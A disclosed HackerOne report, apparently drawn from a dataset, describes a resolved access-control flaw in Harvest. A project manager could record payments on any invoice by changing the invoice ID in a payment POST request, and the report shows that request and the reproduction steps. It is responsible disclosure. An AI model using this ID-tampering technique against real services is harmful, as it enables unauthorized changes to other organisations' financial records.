---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159391'
original_report_id: '159391'
title: Record payment for any invoice by PM (Access control Issue)
weakness: Improper Authentication - Generic
team_handle: harvest
created_at: '2016-08-15T01:53:11.383Z'
disclosed_at: '2016-09-29T23:02:34.680Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- improper-authentication-generic
---

# Record payment for any invoice by PM (Access control Issue)

## Metadata

- HackerOne Report ID: 159391
- Weakness: Improper Authentication - Generic
- Program: harvest
- Disclosed At: 2016-09-29T23:02:34.680Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Description : Project Manager(Full access ) With Access to limited projects also have limited access to Invoices. So Project manager is assigned to limited project by Admin and he have access to limited Invoices related to assigned project. But Project manager can Actually Record payment of any invoice in the company.The HTTP request of Recording payment is Vulnerable to Privilege Escalation where server doesn't check whether Project manager have access to corresponding Invoice or not.

Vulnerable HTTP request : 

POST /invoices/[Invoice_ID]/payments HTTP/1.1
Host: vijaygangani.harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani.harvestapp.com/invoices/10392603
Cookie: [Cookie_values]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 228

utf8=%E2%9C%93&authenticity_token= [Oauth_token]&payment%5Bpaid_at_human_format%5D=08%2F15%2F2016&payment%5Bamount%5D=0.00&payment%5Bnotes%5D= 

Steps to reproduce : 
1.Create a Invoice by project manager account and record the payment for that Invoice.
2.The HTTP request of recording payment would look something like the above mentioned request.
3.Change the Invoice ID in the Request to any other Invoice ID which the project manager doesn't have access to and send the request tot the server.
4.You will see that the Payment will be recorded for your mentioned Invoice ID.


Let me know if you need any further assistance or Video POC to understand the issue.

Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
